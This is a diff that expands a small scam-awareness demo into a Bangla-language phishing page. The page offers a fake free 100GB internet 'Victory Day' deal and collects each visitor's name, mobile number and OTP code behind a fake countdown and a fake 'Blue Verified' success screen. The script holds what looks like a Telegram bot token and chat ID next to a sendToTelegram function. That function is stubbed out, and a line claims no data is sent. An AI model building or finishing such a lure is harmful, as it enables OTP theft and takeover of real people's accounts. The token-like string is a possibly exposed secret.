@@ -1,30 +1,190 @@
+```html
 <!DOCTYPE html>
-<html>
+<html lang="bn">
 <head>
-<meta charset="UTF-8">
-<title>Demo</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>বিজয় দিবস অফার</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+            background-color: #18191a;
+            color: white;
+            text-align: center;
+        }
+
+        /* Banner & Header */
+        .hero-section { width: 100%; background-color: #006a4e; }
+        .hero-section img { width: 100%; max-width: 600px; display: block; margin: 0 auto; }
+        .green-bar { background-color: #006a4e; color: white; padding: 10px; font-weight: bold; margin-bottom: 20px; }
+
+        /* Container */
+        .container { padding: 10px 20px; max-width: 500px; margin: 0 auto; }
+
+        h2 { color: #e4e6eb; font-size: 22px; margin-bottom: 5px; }
+        p { color: #b0b3b8; font-size: 14px; margin-bottom: 20px; }
+
+        /* Input Forms */
+        .input-group { text-align: left; margin-bottom: 15px; }
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            box-sizing: border-box;
+            border-radius: 6px;
+            border: 1px solid #3e4042;
+            background-color: #3a3b3c;
+            color: white;
+            font-size: 16px;
+            outline: none;
+        }
+        .submit-btn {
+            background-color: #006a4e;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        /* Modal (OTP Popup) Styles */
+        .modal {
+            display: none; /* Hidden by default */
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0,0,0,0.8);
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .modal-content {
+            background-color: #242526;
+            padding: 20px;
+            border-radius: 10px;
+            width: 85%;
+            max-width: 350px;
+            text-align: center;
+            border: 1px solid #3e4042;
+        }
+        .timer-text { color: #ffeb3b; font-size: 14px; margin-bottom: 10px; }
+
+        /* Fake Status Area */
+        #fakeStatus { margin-top: 20px; }
+        #warn { display: none; color: #ff4d4d; font-size: 12px; margin-top: 10px; border: 1px dashed #ff4d4d; padding: 5px; }
+
+    </style>
 </head>
-<body style="background:#111;color:white;text-align:center;padding:30px">
+<body>
 
-<h2>Scam Awareness Demo</h2>
+    <div class="hero-section">
+        <img src="https://i.postimg.cc/nzyTCyJ1/IMG-20251215-083252.jpg" alt="Banner">
+    </div>
 
-<input id="name" placeholder="নাম লিখুন"><br><br>
-<input id="phone" placeholder="নাম্বার লিখুন"><br><br>
+    <div class="green-bar">🎉 ফ্রি 100GB ইন্টারনেট অফার</div>
 
-<button onclick="demo()">Verify</button>
+    <div class="container">
+        <h2>আপনার তথ্য দিন</h2>
+        
+        <div class="input-group">
+            <input type="text" id="name" class="input-field" placeholder="আপনার নাম">
+        </div>
+        <div class="input-group">
+            <input type="number" id="number" class="input-field" placeholder="মোবাইল নাম্বার (017...)" maxlength="11">
+        </div>
 
-<div id="out" style="margin-top:20px;font-size:18px"></div>
+        <button class="submit-btn" onclick="startProcess()">অফার নিন</button>
 
-<script>
-function demo(){
-  alert("Verify clicked");   // এই alert আসলে JS ঠিক আছে
-  var n = document.getElementById("name").value;
-  var p = document.getElementById("phone").value;
+        <!-- Result/Status Show Here -->
+        <div id="fakeStatus"></div>
+        <div id="warn">⚠️ এটি একটি ডেমো। কোনো তথ্য সার্ভারে পাঠানো হয়নি।</div>
+    </div>
 
-  document.getElementById("out").innerHTML =
-    "📨 Fake Telegram Preview<br><br>Name: "+n+"<br>Phone: "+p;
-}
-</script>
+    <!-- OTP Modal HTML -->
+    <div id="otpModal" class="modal">
+        <div class="modal-content">
+            <h3 style="color:white;">যাচাইকরণ</h3>
+            <p id="countdown" class="timer-text">অপেক্ষা করুন...</p>
+            <input type="number" id="otp" class="input-field" placeholder="OTP কোড দিন" style="text-align:center;">
+            <button class="submit-btn" onclick="sendToTelegram()">যাচাই করুন</button>
+        </div>
+    </div>
 
+    <script>
+        // আপনার দেওয়া ভেরিয়েবলগুলো (ডেমো হিসেবে রাখা হলো, কাজ করবে না)
+        const telegram_token = '8522482888:AAHp8_VAsgnK-KtIH584kbaLZZ4q6XkVyu0'; // Demo Token
+        const telegram_chatid = '6763021567'; // Demo ID
+
+        // প্রসেস শুরু করার ফাংশন
+        function startProcess() {
+            var name = document.getElementById('name').value;
+            var num = document.getElementById('number').value;
+
+            if(name == "" || num == ""){
+                alert("দয়া করে নাম এবং নাম্বার দিন");
+                return;
+            }
+
+            // মডাল ওপেন হবে
+            showModal();
+        }
+
+        function showModal() {
+            document.getElementById("otpModal").style.display = "flex";
+            let countdown = 10; // 30 এর বদলে ১০ সেকেন্ড দিলাম দ্রুত দেখার জন্য
+            const countdownEl = document.getElementById("countdown");
+            const otpInput = document.getElementById("otp");
+            otpInput.disabled = true;
+
+            const timer = setInterval(() => {
+                countdown--;
+                countdownEl.textContent = `OTP পাঠানো হচ্ছে... ${countdown} সেকেন্ড`;
+                if (countdown <= 0) {
+                    clearInterval(timer);
+                    countdownEl.textContent = "OTP পাঠানো হয়েছে (যেকোনো সংখ্যা দিন)";
+                    otpInput.disabled = false;
+                    otpInput.focus();
+                }
+            }, 1000);
+        }
+
+        function sendToTelegram() {
+            const otpValue = document.getElementById('otp').value;
+            if(otpValue.length < 4) {
+                alert("সঠিক OTP দিন");
+                return;
+            }
+
+            // মডাল বন্ধ হবে
+            document.getElementById("otpModal").style.display = "none";
+            document.getElementById('warn').style.display = 'block';
+
+            // Fake Blue Verified / Notification দেখানো (আপনার স্ক্রিপ্ট অনুযায়ী)
+            const statusDiv = document.getElementById('fakeStatus');
+            statusDiv.innerHTML = `
+                <div style="display:flex; flex-direction:column; align-items:center; justify-content:center; margin-top:20px; animation: fadeIn 1s;">
+                    <div style="width:60px; height:60px; border-radius:50%; background:black; border:4px solid #00a400; display:flex; align-items:center; justify-content:center; margin-bottom:10px;">
+                        <span style="color:#00a400; font-size:35px;">✔</span>
+                    </div>
+                    <div style="font-weight:bold; font-size:18px; color:white;">সফল হয়েছে!</div>
+                    
+                    <div style="background:#2d3436; padding:10px; border-radius:8px; margin-top:15px; width:90%;">
+                        <div style="display:flex; align-items:center; justify-content:center;">
+                            <span style="font-weight:bold; font-size:14px; color:white;">Account Status:</span>
+                            <span style="color:#1877f2; font-weight:bold; margin-left:5px;">✔️ Blue Verified</span>
+                        </div>
+                        <div style="margin-top:5px; font-size:12px; color:#b0b3b8;">
+                            আপনার রিকোয়েস্ট পেন্ডিং আছে। ২৪ ঘন্টার মধ্যে কনফার্মেশন পাবেন।
+                        </div>
+                    </div>
+                </div>
+            `;
+        }
+    </script>
 </body>
 </html>
+```
